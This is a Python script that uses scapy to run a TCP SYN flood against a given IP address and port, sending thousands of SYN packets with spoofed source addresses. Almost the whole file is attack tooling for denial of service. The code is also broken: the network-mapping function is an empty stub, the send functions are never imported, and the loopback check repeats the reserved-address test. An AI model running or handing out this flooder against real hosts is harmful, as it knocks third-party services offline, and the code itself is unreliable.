#!/usr/bin/env python3
import random
import argparse
import sys
import re
import ipaddress
import logging

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import Ether, IP, TCP, getmacbyip, conf

conf.verb = 0

# IP address | MAC address --> all Hosts on the LAN
NET_MAP = []

def net_map(ip):
	"""
	Get all IP hosts that are alive and in same LAN as 'ip'.
	Resolve MAC addresses. 
	"""
	global NET_MAP
	#oct_1 = int(ip[:ip.index('.')])

def tcp_syn_flood(ip, mac, port, n):
	"""
	Through this attack, attackers can flood the victim’s queue that is used for half-opened connections,
	i.e. the connections that has finished SYN, SYN-ACK, but has not yet got a final ACK back. 
	When this queue is full, the victim cannot take any more connection.
	"""

	if len(NET_MAP):
		for i in range(n):
			spoofed_ip, spoofed_mac = random.choice(NET_MAP)
			# send a packet at Layer 2
			sendp(\
				Ether(dst=mac, src=spoofed_mac)/\
					IP(dst=ip, src=spoofed_ip, flags='DF')/\
						TCP(dport=port, sport=random.randint(1, 65535), flags='S')\
				)
	else:
		for i in range(n):
			# send a packet at Layer 3
			send(\
				IP(dst=ip, flags='DF')/\
					TCP(dport=port, sport=random.randint(1, 65535), flags='S')\
				)

def parse_argv(argv):
	"""
	Parse Command Line Arguments
	"""
	parser = argparse.ArgumentParser()
	parser.add_argument('-p', '--port', type=int, dest='port', required=True, help='Destination port number')
	parser.add_argument('-a', '--host', type=str, dest='host', required=True, help='Destination Ip address')
	parser.add_argument('-n', '--pkt-count', type=int, dest='n', default=10000, help='Number of TCP SYN packets to send')

	try:
		res  = parser.parse_args(argv)
		err  = False
		if not re.match("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", res.host):
			print('[ ERROR ] -- Invalid Ip Address')
			err = True

		if res.port < 1 or res.port > 65535:
			print('\033[91m [ ERROR ] -- Invalid Port No. [ 1 <= port <= 65535 ]')
			err = True

		if not err:
			ip_addr = ipaddress.ip_address(res.host)
			if ip_addr.is_reserved:
				print('[ ERROR ] -- Cannot use a Loop-back address')
				sys.exit()
			elif ip_addr.is_reserved:
				print('[ ERROR ] -- Cannot use a Reserved address')
				sys.exit()

			mac = getmacbyip(ip_addr.exploded)
			if mac:
				net_map(ip_addr.exploded)
				return (ip_addr.exploded, mac, res.port, res.n)
			else:
				print('\033[91m[ ERROR ] -- Could not resolve MAC address for [ %s ]' % ip_addr.exploded)
		else:
			sys.exit()
	except:
		#parser.print_help()
		sys.exit()

if __name__ == '__main__':

	ip, mac, port, n = parse_argv(sys.argv[1:])
	if mac:
		NET_MAP      = net_map(ip)
		tcp_syn_flood(ip=ip, mac=mac, port=port, n=n)
	else:
		print('\033[91m[ ERROR ] -- Could not resolve MAC address for [ %s ]' % ip)